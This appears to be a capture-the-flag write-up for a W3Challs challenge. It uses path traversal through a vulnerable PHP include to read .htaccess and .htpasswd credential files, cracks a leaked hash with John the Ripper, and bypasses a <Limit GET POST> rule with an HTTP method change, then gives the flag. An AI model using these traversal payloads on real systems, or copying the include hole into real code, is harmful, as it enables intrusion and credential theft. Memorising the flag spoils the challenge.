# .htaccess

1. First, lets go through the web and view the source on the git repository.
2. Then, we can read the README.md and see that we have to change the path. The most important thing is the "secret" path's name is changed, so the first mission now is find out the hidden name. 
3. Now, we are able to know that we are in the direction "inc" and after we read "index.php".
    ```
    <?php

    require_once __DIR__.'/inc/top.php';

    if (isset($_GET['page']) && is_string($_GET['page']))
    {
        $page = __DIR__.'/inc/'.$_GET['page'];

        if (!file_exists($page))
        {
            printf('<div class="error">This page doesn\'t exist!</div>');
            exit();
        }

        require_once $page;
    }
    else
        require_once __DIR__.'/inc/home.php';

    require_once __DIR__.'/inc/footer.php';

    ?>
    ```
    We know that we have to traval the file by the url "http://htaccess.hax.w3challs.com/index.php?page=". Now, we are able to travel and we first go through the direction "http://htaccess.hax.w3challs.com/index.php?page=../admin/.htaccess". Here is the data we get : 
    ```
    AuthUserFile /home/htaccess/www/UlTr4_S3cR3T_p4Th/.htpasswd AuthGroupFile /dev/null AuthName "Private area" AuthType Basic require valid-user
    ```
    The most important thing is we get the name of the "secret" file "UlTr4_S3cR3T_p4Th". 
4. Now, we are able to get more information by "http://htaccess.hax.w3challs.com/index.php?page=../UlTr4_S3cR3T_p4Th/.htpasswd" and here is the data we get : 
    ```
    admin1:$apr1$Ikl22aeJ$w1uWlBGlbatPnETT2XGx.. 
    admin2:$apr1$yJnQGpTi$WF5eCC/8lKsgBKY7fvag60 
    admin3:$apr1$fN20xzIa$UAnYxYS8qRiO8WKPJwOlK1 
    admin4:zQMI5ehC.sED2 
    admin5:{SHA}CKVCPg9EZI8U9KPPakEXgfXrMIc= 
    superadmin:{SHA}pAsyOzA/MHasbNO0OKRuXSp5sRI=
    ```
    After get the information, the first thing I do is using john the ripper to crack the code and I get : 
    ```
    Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
    Use the "--format=md5crypt-long" option to force loading these as that type instead
    Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
    Use the "--format=md5crypt-opencl" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE4.1 4x5])
    Proceeding with single, rules:Single
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Almost done: Processing the remaining buffered candidate passwords, if any.
    Proceeding with wordlist:/usr/local/Cellar/john-jumbo/1.9.0/share/john/password.lst, rules:Wordlist
    orange           (?)
    1g 0:00:00:00 DONE 2/3 (2020-02-02 17:22) 100.0g/s 14000p/s 14000c/s 14000C/s brian..skippy
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed
    ```
    So, we know the username : admin1 and the password : orange. Now, lets login "http://htaccess.hax.w3challs.com/admin/" and get the first part of the flag.
5. Then, we have to login superadmin to get the second part of the flag. After tones of time cracking "{SHA}pAsyOzA/MHasbNO0OKRuXSp5sRI=", I find out that it is impossible to crack it. Well ... maybe ten years but I have no time! So, I seek of another way to pass it. I read more closer to the "superadmin/.htaccess" file : 
    ```
    AuthUserFile /var/www/secret/.htpasswd_super
    AuthGroupFile /dev/null
    AuthName "Private area - superadmin only"
    AuthType Basic

    <Limit GET POST>
        require valid-user
    </Limit>
    ```
    Lets get closer look to the "Limit" part, and here some [information](https://defendtheweb.net/discussion/1159-bypassing-htaccesshtpasswd-based-authentication) I found on the web. Now, we are able to by pass it by changing the method using the url "http://htaccess.hax.w3challs.com/superadmin/index.php" and get the second part of the flag.
6. Here is the flag : W3C{__0hMyG0d_Th3yKi7l3dk3nNy}
